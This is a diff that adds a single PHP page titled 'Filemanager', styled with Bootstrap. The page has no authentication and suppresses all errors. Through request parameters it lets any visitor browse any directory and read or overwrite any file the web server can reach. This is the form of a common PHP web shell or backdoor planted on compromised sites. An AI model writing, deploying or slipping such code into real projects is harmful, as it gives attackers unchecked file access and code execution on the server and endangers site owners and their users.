@@ -1,0 +1,133 @@
+<!DOCTYPE html>
+<html>
+<head>
+<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
+<script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
+<script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
+	<title>Filemanager</title>
+</head>
+<style type="text/css">
+	div.manager {
+		width:70%;
+	} td.edit {
+		border:none;
+		background:none;
+	} textarea.edit {
+		height:300px;
+	} th {
+		text-align:center;
+	} .icon {
+		width:25px;
+		height:25px;
+	}
+</style>
+<body>
+<br>
+<?php
+error_reporting(0);
+define('SEP', '/');
+if (isset($_GET['dir'])) {
+	@chdir($_GET['dir']);
+}
+function cwd() {
+	$cwd = @str_replace('\\', '/', @getcwd());
+	return $cwd;
+}
+function pwd() {
+	$dir = @explode('/', @cwd());
+	foreach ($dir as $key => $pwd) {
+		print("<a href='?dir=");
+		for ($i=0; $i <= $key ; $i++) { 
+			print($dir[$i]);
+			if ($i != $key) {
+				print("/");
+			}
+		} print("'>".$pwd."</a>/");
+	}
+}
+function edit($filename, $text) {
+	$fp = @fopen($filename, 'w');
+	if (@fwrite($fp, $text)) {
+		print("Success");
+	} else {
+		print("Failed");
+	}
+}
+?>
+<center>
+	<div class="form-control manager" disable>
+		<center><h4>FILEMANAGER</h4></center>
+		<table width="100%" align="center" class="table-striped">
+			<tr>
+    		<th colspan="2">
+    			<center>
+    				<?php print @pwd() ?>
+    			</center>
+    		</th>
+    	</tr>
+		<tr>
+			<?php
+			if ($_POST['do'] == 'edit') {
+	          if (isset($_POST['submit'])) {
+		        @edit($_POST['file'], $_POST['text']);
+	        } $text = @htmlspecialchars(@file_get_contents($_POST['file']));
+	        ?>
+	        <form method="post">
+	        	<td colspan="2" class="edit">
+	        	<textarea class="form-control edit" name="text"><?php print $text ?></textarea></td>
+	        	<input type="hidden" name="do" value="edit">
+	        	<input type="hidden" name="file" value="<?php print $_POST['file'] ?>">
+		        <tr><td colspan="2" class="edit">
+		        <center>
+		        	<input style="width:100%;" type="submit" name="submit" class="btn btn-success">
+		        </center></td>
+	        </form>
+	        <?php
+            }
+			?>
+		</tr>
+    	<tr>
+    		<th>Filename</th>
+    		<th>Action</th>
+    	</tr>
+    	<?php
+    	$scandir = @scandir(@cwd());
+    	foreach ($scandir as $dir) {
+    		if (!is_dir($dir)) continue;
+    		if ($dir === '.' || $dir === '..') continue;
+    		?><tr>
+    			<td>
+    				<img src="http://icons.iconarchive.com/icons/custom-icon-design/flatastic-1/256/folder-icon.png" class="icon"> 
+    				 <a href="?dir=<?php print @cwd().SEP.$dir ?>"><?php print $dir ?></a>
+    			</td>
+    			<td></td>
+    		</tr> 
+    		<?php
+    	}
+    	foreach ($scandir as $file) {
+    		if (!is_file($file)) continue;
+    		?>
+    		<tr>
+    			<td>
+    				<img src="https://cdn.icon-icons.com/icons2/205/PNG/512/text_plain_24600.png" class="icon"> 
+    				 <?php print $file ?>
+    			</td>
+    			<td><center>
+    				<form method="post" action="?dir=<?php print @cwd() ?>">
+    					<select name="do">
+    						<option value="edit">Edit</option>
+    					</select>
+    					<input type="hidden" name="file" value="<?php print @cwd().SEP.$file ?>">
+    					<input type="submit">
+    				</form>
+    			</td>
+    		</tr>
+    		<?php
+    	}
+    	?>
+    </table>
+	</div>
+</center>
+</body>
+</html>
